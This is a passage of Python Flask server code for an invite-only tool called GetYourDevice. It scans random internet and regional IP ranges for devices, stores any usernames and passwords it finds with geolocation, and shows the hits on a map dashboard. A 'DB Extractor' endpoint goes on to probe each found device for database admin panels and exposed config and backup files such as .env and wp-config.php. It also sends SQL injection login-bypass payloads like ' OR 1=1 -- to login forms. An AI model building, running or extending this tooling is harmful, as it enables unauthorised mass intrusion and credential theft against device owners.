                    results.append({"ip": ip, "status": "unreachable", "error": str(e)[:100]})
        return jsonify({"results": results, "total": len(results)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ─────────────── Scan API ───────────────

@app.route("/api/scan", methods=["POST"])
@require_auth
def api_scan(user):
    body = request.get_json(force=True)
    target = body.get("target", "")
    region = body.get("region", "")
    internet = body.get("internet", False)
    max_ips = int(body.get("max_ips", 500))
    threads = int(body.get("threads", 10))
    ports = body.get("ports", "fast")
    country = body.get("country", None)
    do_geo = body.get("geo", False)

    from GetYourDevice import (
        generate_region_ips, generate_internet_ips, generate_ips,
        scan_single, SCAN_PORTS, ALL_PORTS, GeoEnricher, REGION_CONFIG
    )
    from concurrent.futures import ThreadPoolExecutor, as_completed
    from threading import Lock

    selected_ports = ALL_PORTS if ports == "all" else SCAN_PORTS
    cap = max_ips

    include_countries = None
    if country:
        include_countries = set(c.strip().upper() for c in country.split(",") if c.strip())

    if region and region in REGION_CONFIG:
        ips = generate_region_ips(region, cap, include_countries=include_countries)
    elif target:
        ips = generate_ips(target, cap)
    else:
        ips = generate_internet_ips(cap)

    all_results = []
    scanned = 0
    scanned_lock = Lock()
    results_lock = Lock()

    with ThreadPoolExecutor(max_workers=min(threads, 50)) as pool:
        fut_to_ip = {pool.submit(scan_single, ip, False, selected_ports): ip for ip in ips}
        for fut in as_completed(fut_to_ip):
            try:
                res = fut.result()
                if res:
                    with results_lock:
                        all_results.extend(res)
            except Exception:
                pass

    if do_geo and all_results:
        geo_ips = list(set(r["ip"] for r in all_results))
        geo_data = GeoEnricher.enrich_batch(geo_ips)
        for r in all_results:
            g = geo_data.get(r["ip"], {})
            r.update(g)

    uid = user.id
    creds_count = sum(1 for r in all_results if r.get("auth_found"))
    open_count = sum(1 for r in all_results if r.get("no_auth"))

    if all_results:
        try:
            scan_resp = supabase.table("scan_results").insert({
                "user_id": uid,
                "total_scanned": len(ips),
                "results_count": len(all_results),
                "creds_count": creds_count,
                "open_count": open_count,
                "region": region or "internet",
                "ports": ports,
                "created_at": datetime.now(timezone.utc).isoformat(),
            }).execute()
            result_id = scan_resp.data[0]["id"]
            items = []
            for i, r in enumerate(all_results):
                items.append({
                    "result_id": str(result_id),
                    "item_index": i,
                    "ip": r.get("ip"), "port": r.get("port"),
                    "url": r.get("url"), "device": r.get("device"),
                    "no_auth": r.get("no_auth"), "auth_found": r.get("auth_found"),
                    "username": r.get("username"), "password": r.get("password"),
                    "note": r.get("note"), "status_code": r.get("status_code"),
                    "country": r.get("country"), "country_code": r.get("country_code"),
                    "region_name": r.get("region"), "city": r.get("city"),
                    "lat": r.get("lat"), "lon": r.get("lon"),
                    "org": r.get("org"), "isp": r.get("isp"),
                    "as_info": r.get("as"),
                    "broken": False,
                })
            supabase.table("scan_result_items").insert(items).execute()
        except Exception as e:
            print(f"[!] DB save error: {e}")

    return jsonify({
        "status": "ok",
        "total_scanned": len(ips),
        "results_count": len(all_results),
        "results": all_results,
    })

@app.route("/api/scan/jobs", methods=["POST"])
@require_auth
def api_scan_start_job(user):
    cleanup_scan_jobs()
    body = request.get_json(force=True) or {}
    job_id = uuid.uuid4().hex
    region = body.get("region", "")
    if body.get("internet"):
        region = "internet"
    job = {
        "id": job_id,
        "user_id": user.id,
        "status": "queued",
        "created_at": datetime.now(timezone.utc).isoformat(),
        "started_at": None,
        "completed_at": None,
        "finished_ts": None,
        "total": 0,
        "scanned": 0,
        "results": [],
        "logs": [],
        "error": None,
        "result_id": None,
        "target": body.get("target", ""),
        "region": region,
        "max_ips": int(body.get("max_ips", 500)),
        "threads": int(body.get("threads", 10)),
        "ports": body.get("ports", "fast"),
        "country": body.get("country"),
        "geo": bool(body.get("geo", False)),
        "cancel": threading.Event(),
        "lock": threading.RLock(),
    }
    with scan_jobs_lock:
        scan_jobs[job_id] = job
    thread = threading.Thread(target=run_scan_job, args=(job_id,), daemon=True)
    job["thread"] = thread
    thread.start()
    return jsonify(scan_job_snapshot(job)), 202

@app.route("/api/scan/jobs/active", methods=["GET"])
@require_auth
def api_scan_active_job(user):
    cleanup_scan_jobs()
    active_statuses = {"queued", "running", "stopping"}
    with scan_jobs_lock:
        jobs = [
            job for job in scan_jobs.values()
            if job.get("user_id") == user.id and job.get("status") in active_statuses
        ]
    if not jobs:
        return jsonify({"job": None})
    jobs.sort(key=lambda j: j.get("created_at") or "", reverse=True)
    return jsonify({"job": scan_job_snapshot(jobs[0])})

@app.route("/api/scan/jobs/<job_id>", methods=["GET"])
@require_auth
def api_scan_job_status(user, job_id):
    cleanup_scan_jobs()
    job = get_scan_job_for_user(job_id, user.id)
    if not job:
        return jsonify({"error": "scan job not found"}), 404
    return jsonify(scan_job_snapshot(job))

@app.route("/api/scan/jobs/<job_id>/stop", methods=["POST"])
@require_auth
def api_scan_stop_job(user, job_id):
    job = get_scan_job_for_user(job_id, user.id)
    if not job:
        return jsonify({"error": "scan job not found"}), 404
    with job["lock"]:
        if job["status"] in ("queued", "running"):
            job["status"] = "stopping"
            job["cancel"].set()
            scan_job_log(job, "Stopping...", "info")
    return jsonify(scan_job_snapshot(job))

@app.route("/api/scan/stream", methods=["POST"])
@require_auth
def api_scan_stream(user):
    from GetYourDevice import (
        generate_region_ips, generate_internet_ips, generate_ips,
        scan_single, SCAN_PORTS, ALL_PORTS, REGION_CONFIG
    )
    from concurrent.futures import ThreadPoolExecutor, as_completed
    from threading import Lock

    body = request.get_json(force=True)
    target = body.get("target", "")
    region = body.get("region", "")
    internet = body.get("internet", False)
    max_ips = int(body.get("max_ips", 500))
    threads = int(body.get("threads", 10))
    ports = body.get("ports", "fast")
    country = body.get("country", None)
    do_geo = body.get("geo", False)

    selected_ports = ALL_PORTS if ports == "all" else SCAN_PORTS
    cap = max_ips

    include_countries = None
    if country:
        include_countries = set(c.strip().upper() for c in country.split(",") if c.strip())

    if region and region in REGION_CONFIG:
        ips = generate_region_ips(region, cap, include_countries=include_countries)
    elif target:
        ips = generate_ips(target, cap)
    else:
        ips = generate_internet_ips(cap)

    def event_stream():
        total = len(ips)
        yield f"event: start\ndata: {json.dumps({'total': total})}\n\n"

        all_results = []
        scanned = 0
        scanned_lock = Lock()
        results_lock = Lock()
        event_queue = queue.Queue()
        done = threading.Event()

        def heartbeat():
            while not done.is_set():
                event_queue.put(("ping", None))
                done.wait(5)
        hb = threading.Thread(target=heartbeat, daemon=True)
        hb.start()

        def scan_worker():
            nonlocal scanned
            with ThreadPoolExecutor(max_workers=min(threads, 50)) as pool:
                fut_map = {pool.submit(scan_single, ip, False, selected_ports): ip for ip in ips}
                for fut in as_completed(fut_map):
                    ip = fut_map[fut]
                    with scanned_lock:
                        scanned += 1
                    try:
                        res = fut.result()
                    except Exception:
                        res = None
                    if res:
                        with results_lock:
                            all_results.extend(res)
                        event_queue.put(("hit", {'ip': ip, 'results': res}))
                    event_queue.put(("progress", {'scanned': scanned, 'total': total, 'hits': len(all_results), 'ip': ip}))
            event_queue.put(("_done", None))

        sw = threading.Thread(target=scan_worker, daemon=True)
        sw.start()

        while True:
            try:
                evt_type, data = event_queue.get(timeout=10)
            except queue.Empty:
                yield f"event: ping\ndata: {json.dumps({'t': time.time()})}\n\n"
                continue
            if evt_type == "_done":
                break
            if evt_type == "ping":
                yield f"event: ping\ndata: {json.dumps({'t': time.time()})}\n\n"
            elif evt_type == "hit":
                yield f"event: hit\ndata: {json.dumps(data)}\n\n"
            elif evt_type == "progress":
                yield f"event: progress\ndata: {json.dumps(data)}\n\n"
        done.set()

        if do_geo and all_results:
            from GetYourDevice import GeoEnricher
            geo_ips = list(set(r["ip"] for r in all_results))
            geo_data = GeoEnricher.enrich_batch(geo_ips)
            for r in all_results:
                g = geo_data.get(r["ip"], {})
                r.update(g)

        uid = user.id
        creds_count = sum(1 for r in all_results if r.get("auth_found"))
        open_count = sum(1 for r in all_results if r.get("no_auth"))

        if all_results:
            try:
                scan_resp = supabase.table("scan_results").insert({
                    "user_id": uid,
                    "total_scanned": total,
                    "results_count": len(all_results),
                    "creds_count": creds_count,
                    "open_count": open_count,
                    "region": region or "internet",
                    "ports": ports,
                    "created_at": datetime.now(timezone.utc).isoformat(),
                }).execute()
                result_id = scan_resp.data[0]["id"]
                items = []
                for i, r in enumerate(all_results):
                    items.append({
                        "result_id": str(result_id),
                        "item_index": i,
                        "ip": r.get("ip"), "port": r.get("port"),
                        "url": r.get("url"), "device": r.get("device"),
                        "no_auth": r.get("no_auth"), "auth_found": r.get("auth_found"),
                        "username": r.get("username"), "password": r.get("password"),
                        "note": r.get("note"), "status_code": r.get("status_code"),
                        "country": r.get("country"), "country_code": r.get("country_code"),
                        "region_name": r.get("region"), "city": r.get("city"),
                        "lat": r.get("lat"), "lon": r.get("lon"),
                        "org": r.get("org"), "isp": r.get("isp"),
                        "as_info": r.get("as"),
                        "broken": False,
                    })
                supabase.table("scan_result_items").insert(items).execute()
            except Exception as e:
                print(f"[!] Stream scan DB save error: {e}")

        yield f"event: done\ndata: {json.dumps({'total_scanned': total, 'results_count': len(all_results)})}\n\n"

    return Response(event_stream(), mimetype="text/event-stream")

# ─────────────── Invite code management ───────────────

@app.route("/api/admin/invites", methods=["GET"])
@require_auth
def api_list_invites(user):
    try:
        resp = supabase.table("invite_codes").select("*").order("created_at", desc=True).execute()
        for r in resp.data:
            r["id"] = str(r["id"])
        return jsonify(resp.data)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/admin/invites", methods=["POST"])
@require_auth
def api_create_invite(user):
    code = uuid.uuid4().hex[:8].upper()
    try:
        supabase.table("invite_codes").insert({
            "code": code, "status": "active", "issuer": user.id,
        }).execute()
        return jsonify({"status": "ok", "code": code})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ─────────────── Main route ───────────────

@app.route("/")
def index():
    if app.static_folder and os.path.exists(os.path.join(app.static_folder, 'index.html')):
        return app.send_static_file('index.html')
    return "Frontend not built. Please run 'npm run build-all' in the root directory.", 404

@app.route("/app")
def app_spa():
    if app.static_folder and os.path.exists(os.path.join(app.static_folder, 'index.html')):
        return app.send_static_file('index.html')
    return "Frontend not built. Please run 'npm run build-all' in the root directory.", 404

# ─────────────── Dashboard stats ───────────────

@app.route("/api/dashboard/stats", methods=["GET"])
@require_auth
def api_dashboard_stats(user):
    try:
        scans = supabase.table("scan_results").select("*").eq("user_id", user.id).order("created_at", desc=True).limit(100).execute()
        total_scans = len(scans.data)
        total_results = sum(r.get("results_count", 0) for r in scans.data)
        total_creds = sum(r.get("creds_count", 0) for r in scans.data)
        total_open = sum(r.get("open_count", 0) for r in scans.data)
        scan_ids = [str(r["id"]) for r in scans.data if r.get("results_count", 0) > 0]
        by_country = {}
        by_port = {}
        recent_items = []
        geo_points = []
        if scan_ids:
            items = supabase.table("scan_result_items").select("*").in_("result_id", scan_ids).order("item_index", desc=True).limit(2000).execute()
            seen_ips = set()
            countries_set = set()
            for it in items.data:
                lat = it.get("lat")
                lon = it.get("lon")
                if lat and lon:
                    geo_points.append({
                        "lat": lat, "lon": lon,
                        "ip": it.get("ip"), "port": it.get("port"),
                        "device": it.get("device"), "country_code": it.get("country_code"),
                        "org": it.get("org"), "isp": it.get("isp"),
                        "as_info": it.get("as"), "url": it.get("url"),
                        "auth_found": it.get("auth_found"), "no_auth": it.get("no_auth"),
                        "username": it.get("username"), "password": it.get("password"),
                    })
                cc = it.get("country_code") or ""
                if cc:
                    countries_set.add(cc)
                    if cc not in by_country:
                        by_country[cc] = {"code": cc, "count": 0, "creds": 0, "open": 0, "lat": lat, "lon": lon}
                    by_country[cc]["count"] += 1
                    if it.get("auth_found"): by_country[cc]["creds"] += 1
                    if it.get("no_auth"): by_country[cc]["open"] += 1
                port = it.get("port")
                if port:
                    ps = str(port)
                    by_port[ps] = by_port.get(ps, 0) + 1
                if it.get("ip"): seen_ips.add(it.get("ip"))
                if len(recent_items) < 20:
                    recent_items.append({
                        "ip": it.get("ip"), "port": it.get("port"),
                        "device": it.get("device"), "country_code": it.get("country_code"),
                        "auth_found": it.get("auth_found"), "no_auth": it.get("no_auth"),
                        "url": it.get("url"),
                    })
        country_list = sorted(by_country.values(), key=lambda x: x["count"], reverse=True)
        port_list = sorted([{"port": int(k), "count": v} for k, v in by_port.items()], key=lambda x: x["count"], reverse=True)
        return jsonify({
            "stats": {
                "total_scans": total_scans,
                "total_results": total_results,
                "total_creds": total_creds,
                "total_open": total_open,
                "countries_hit": len(countries_set),
                "unique_ips": len(seen_ips),
            },
            "by_country": country_list[:30],
            "by_port": port_list[:20],
            "recent": recent_items,
            "geo_points": geo_points,
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ─────────────── OSINT Tools ───────────────

def _resolve_dns(name):
    import socket
    try:
        return socket.gethostbyname(name)
    except:
        pass
    try:
        r = requests.get(f"https://dns.google/resolve?name={name}&type=A", timeout=5)
        if r.ok:
            for ans in r.json().get("Answer", []):
                if ans.get("type") == 1:
                    return ans["data"]
    except:
        pass
    return None


@app.route("/api/osint/ip", methods=["POST"])
@require_auth
def api_osint_ip(user):
    import socket
    body = request.get_json(force=True) or {}
    target = body.get("target", "").strip()
    if not target:
        return jsonify({"error": "target required"}), 400
    result = {"target": target, "ip": None, "geo": None, "reverse_dns": None}
    # Check if target is already an IP
    try:
        socket.inet_aton(target)
        addr = target
        result["ip"] = addr
    except socket.error:
        addr = _resolve_dns(target)
        if not addr:
            return jsonify({"error": f"DNS resolution failed for '{target}'"}), 400
        result["ip"] = addr
    try:
        host = socket.gethostbyaddr(addr)
        result["reverse_dns"] = host[0]
    except:
        pass
    try:
        r = requests.get(f"http://ip-api.com/json/{addr}?fields=66846719", timeout=5)
        if r.ok:
            result["geo"] = r.json()
    except:
        pass
    return jsonify(result)


@app.route("/api/osint/dns", methods=["POST"])
@require_auth
def api_osint_dns(user):
    import socket
    body = request.get_json(force=True) or {}
    domain = body.get("domain", "").strip()
    if not domain:
        return jsonify({"error": "domain required"}), 400
    result = {"domain": domain, "records": {}}
    addr = _resolve_dns(domain)
    result["records"]["a"] = addr
    if addr:
        try:
            result["records"]["mx"] = list(socket.gethostbyname_ex(domain)[2])
        except:
            pass
    return jsonify(result)


@app.route("/api/osint/email", methods=["POST"])
@require_auth
def api_osint_email(user):
    body = request.get_json(force=True) or {}
    domain = body.get("domain", "").strip().lower()
    if not domain or "." not in domain:
        return jsonify({"error": "valid domain required"}), 400
    patterns = [
        "admin@{d}", "info@{d}", "contact@{d}", "support@{d}",
        "sales@{d}", "webmaster@{d}", "postmaster@{d}",
        "hostmaster@{d}", "abuse@{d}", "noreply@{d}",
        "hello@{d}", "help@{d}", "service@{d}",
    ]
    name = domain.split("@")[-1] if "@" in domain else domain
    common = [p.format(d=name) for p in patterns]
    return jsonify({"domain": name, "emails": common, "count": len(common)})


# ─────────────── DB Extractor ───────────────

DB_TOOL_PATHS = [
    "/phpmyadmin/", "/phpMyAdmin/", "/pma/", "/adminer/", "/adminer.php",
    "/mysql/", "/sql/", "/phpmyadmin2/", "/phpPgAdmin/",
    "/pgadmin/", "/sqlbuddy/", "/myadmin/", "/webadmin/",
    "/panel/database", "/db/", "/database/", "/dbadmin/",
]

COMMON_BACKUP_PATHS = [
    "/backup/", "/backup.sql", "/db.sql", "/database.sql",
    "/dump.sql", "/sql.sql", "/config.bak", "/config.php~",
    "/.env", "/.env.bak", "/config.php.bak", "/wp-config.php",
    "/.git/config", "/app/config.php", "/config/", "/admin/config.php",
    "/private/config.php", "/includes/config.php",
]

SQLI_PAYLOADS = ["' OR 1=1 --", "' OR '1'='1", "admin' --", "' UNION SELECT 1,2,3 --",
                  "1' OR '1'='1", "\" OR 1=1 --", "admin\" --"]


@app.route("/api/devices/<item_id>/db-extract", methods=["POST"])
@require_auth
def api_db_extract(user, item_id):
    import requests as http_req
    body = request.get_json(force=True) or {}
    try:
        resp = supabase.table("scan_result_items").select("*").eq("id", item_id).limit(1).execute()
        if not resp.data:
            return jsonify({"error": "not found"}), 404
        item = resp.data[0]
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    ip = item.get("ip", "")
    port = item.get("port", 80)
    scheme = "https" if port in (443, 8443, 9443) else "http"
    base_url = f"{scheme}://{ip}:{port}"
    ses = http_req.Session()
    results = []

    # Phase 1: Check for DB admin tools
    for path in DB_TOOL_PATHS:
        url = base_url + path
        try:
            r = ses.get(url, timeout=4, verify=False, allow_redirects=True)
            text = (r.text or "").lower()
            if r.status_code == 200 and len(text) > 50:
                keywords = ["phpmyadmin", "adminer", "mysql", "database", "server", "sql", "phpmyadmin",
                            "php pgadmin", "pgadmin", "sqlbuddy"]
                if any(k in text for k in keywords):
                    results.append({"type": "db_tool", "url": url, "detail": f"Accessible ({r.status_code})"})
        except:
            pass

    # Phase 2: Check for backup / config files
    for path in COMMON_BACKUP_PATHS:
        url = base_url + path
        try:
            r = ses.get(url, timeout=4, verify=False, allow_redirects=False)
            if r.status_code == 200:
                ct = (r.headers.get("Content-Type", "") or "").lower()
                text = r.text or ""
                if any(k in text.lower() for k in ("password", "db_host", "db_user", "db_name", "sql",
                                                     "mysql", "insert into", "create table", "define(")):
                    results.append({"type": "config_leak", "url": url, "detail": f"Potential leak ({len(text)} bytes)"})
                elif "text/plain" in ct or "application/octet" in ct:
                    results.append({"type": "backup_file", "url": url, "detail": f"Accessible ({len(text)} bytes)"})
        except:
            pass

    # Phase 3: SQL injection test on login form fields
    try:
        r = ses.get(base_url, timeout=5, allow_redirects=True, verify=False)
        page = r.text or ""
    except:
        page = ""

    from GetYourDevice import extract_login_form, extract_form_fields, body_has_password_input
    login_form = extract_login_form(page)
    sqli_findings = []

    if login_form and login_form.get("inputs"):
        action_url = login_form["action"]
        if action_url.startswith("/"):
            action_url = f"{scheme}://{ip}:{port}{action_url}"
        elif not action_url.startswith("http"):
            action_url = f"{base_url}/{action_url}"
        method = login_form.get("method", "POST")

        for payload in SQLI_PAYLOADS:
            data = {}
            has_pw = False
            for inp in login_form["inputs"]:
                inp_type = inp.get("type", "text").lower()
                inp_name = inp.get("name", "")
                if inp_type == "password":
                    data[inp_name] = payload
                    has_pw = True
                elif inp_type == "hidden":
                    data[inp_name] = inp.get("value", "")
                else:
                    data[inp_name] = payload
            if not has_pw:
                # Use payload in all text fields
                for inp in login_form["inputs"]:
                    if inp.get("type", "text").lower() not in ("hidden", "submit", "button"):
                        data[inp.get("name", "")] = payload
            try:
                if method == "GET":
                    resp = ses.get(action_url, params=data, timeout=5, allow_redirects=False, verify=False)
                else:
                    resp = ses.post(action_url, data=data, timeout=5, allow_redirects=False, verify=False)

                body = resp.text or ""
                body_lower = body.lower()[:3000]
                # Check for SQL error messages
                sql_errors = ["sql syntax", "mysql_fetch", "sqlite", "odbc", "you have an error in your sql",
                              "unclosed quotation mark", "warning: mysql", "supplied argument is not a valid mysql",
                              "pg_query", "sqlsrv", "driver", "db2_", "oci_"]
                found_errors = [e for e in sql_errors if e in body_lower]
                if found_errors:
                    sqli_findings.append({
                        "payload": payload,
                        "status": resp.status_code,
                        "errors": found_errors[:3],
                        "is_vulnerable": True,
                    })
                # Also check if response is different from baseline (possible blind SQLi)
                if resp.status_code == 200:
                    from difflib import SequenceMatcher
                    ratio = SequenceMatcher(None, page[:2000], body[:2000]).ratio()
                    if ratio < 0.85 and ratio > 0.10:
                        sqli_findings.append({
                            "payload": payload,
                            "status": resp.status_code,
                            "diff_ratio": round(ratio, 3),
                            "is_vulnerable": False,
                            "errors": ["Significant response difference - possible SQLi"],
                        })
            except:
                pass

    if sqli_findings:
        results.append({"type": "sql_injection", "detail": f"{len(sqli_findings)} tests", "findings": sqli_findings[:5]})

    return jsonify({"status": "ok", "device": f"{ip}:{port}", "findings": results, "total": len(results)})


@app.route("/api/health")
def api_health():
    return jsonify({
        "status": "ok",
        "time": datetime.now(timezone.utc).isoformat(),
        "version": "7.1",
        "supabase": bool(supabase),
        "invite_only": INVITE_ONLY,
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    worker_mode = os.environ.get("GYD_PYTHON_WORKER") == "1"
    host = os.environ.get("HOST") or ("127.0.0.1" if worker_mode else "0.0.0.0")
    debug = os.environ.get("FLASK_DEBUG") == "1" and not worker_mode
    role = "worker" if worker_mode else "web"
    print(f"[*] GYD Python {role} on http://{host}:{port}")
    app.run(host=host, port=port, debug=debug, use_reloader=False)
